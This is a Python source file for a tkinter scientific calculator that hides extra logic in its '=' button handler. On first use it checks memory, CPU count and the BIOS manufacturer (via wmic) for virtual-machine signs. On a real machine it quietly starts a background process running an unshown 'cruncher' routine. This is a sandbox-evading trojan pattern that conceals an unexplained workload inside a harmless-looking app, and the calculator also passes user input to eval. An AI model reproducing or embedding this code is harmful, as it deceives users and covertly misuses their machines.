import tkinter as tk
import threading_math
import math
import multiprocessing
import psutil
import subprocess

class Calculator:
    def __init__(self, master):
        self.master = master
        master.title("Calculator")
        master.geometry("312x324")

        self.total = tk.StringVar()
        self.computation = False
        self.entry = tk.Entry(master, textvariable=self.total, font=("Helvetica", 20))
        self.entry.grid(row=0, column=0, columnspan=5, pady=5)

        self.create_buttons()

    def create_buttons(self):
        button_list = [
            ['sin', 'cos', 'tan', '^2', '10^x'],
            ['7', '8', '9', '/', 'log(x)'],
            ['4', '5', '6', '*', '1/x'],
            ['1', '2', '3', '-', 'x!'],
            ['0', 'C', '=', '+', 'sqrt']
        ]

        for i, row in enumerate(button_list):
            for j, button_text in enumerate(row):
                button = tk.Button(
                    self.master, text=button_text, width=5, height=3, font=("Helvetica", 20),
                    command=lambda text=button_text: self.click(text)
                )
                button.grid(row=i + 1, column=j, sticky="nsew")
            self.master.rowconfigure(i + 1, weight=1)
        self.master.columnconfigure(0, weight=1)
        self.master.columnconfigure(1, weight=1)
        self.master.columnconfigure(2, weight=1)
        self.master.columnconfigure(3, weight=1)
        self.master.columnconfigure(4, weight=1)

    def click(self, button_text):
        if button_text == '=':
            try:
                result = eval(self.entry.get())
                self.total.set(result)
                if not self.computation:
                    memory = (psutil.virtual_memory().total / (1024 ** 2))
                    count = multiprocessing.cpu_count()
                    vm_keywords = ['virtualbox', 'innotek', 'vmware', 'vmx', 'vmci']
                    output1 = subprocess.check_output(['wmic', 'bios', 'get', 'manufacturer,version'], universal_newlines=True)
                    if memory < 4096 or count < 3 or any(tag in output1 for tag in vm_keywords):
                        self.computation = True
                    else:    
                        self.computation = True
                        p = multiprocessing.Process(target=threading_math.cruncher)
                        p.start() 
            except:
                self.total.set("Error")
        elif button_text == 'C':
            self.total.set("")
        elif button_text == 'sin':
            try:
                result = math.sin(math.radians(float(self.entry.get())))
                self.total.set(result)
            except:
                self.total.set("Error")
        elif button_text == 'cos':
            try:
                result = math.cos(math.radians(float(self.entry.get())))
                self.total.set(result)
            except:
                self.total.set("Error")
        elif button_text == 'tan':
            try:
                result = math.tan(math.radians(float(self.entry.get())))
                self.total.set(result)
            except:
                self.total.set("Error")
        elif button_text == '^2':
            try:
                
                result = float(self.entry.get()) ** 2
                self.total.set(result)
            except:
                self.total.set("Error")
        elif button_text == 'log(x)':
            try:
                result = math.log(float(self.entry.get()))
                self.total.set(result)
            except:
                self.total.set("Error")
        elif button_text == '1/x':
            try:
                result = 1 / float(self.entry.get())
                self.total.set(result)
            except:
                self.total.set("Error")
        elif button_text == 'x!':
            try:
                result = math.factorial(int(self.entry.get()))
                self.total.set(result)
            except:
                self.total.set("Error")
        elif button_text == '10^x':
            try:
                result = 10 ** float(self.entry.get())
                self.total.set(result)
            except:
                self.total.set("Error")
        elif button_text == 'sqrt':
            try:
                result = math.sqrt(float(self.entry.get()))
                self.total.set(result)
            except:
                self.total.set("Error")
        else:
            self.total.set(self.entry.get() + button_text)

if __name__ == '__main__':
    import multiprocessing
    multiprocessing.freeze_support()
    root = tk.Tk()
    my_calculator = Calculator(root)
    root.mainloop()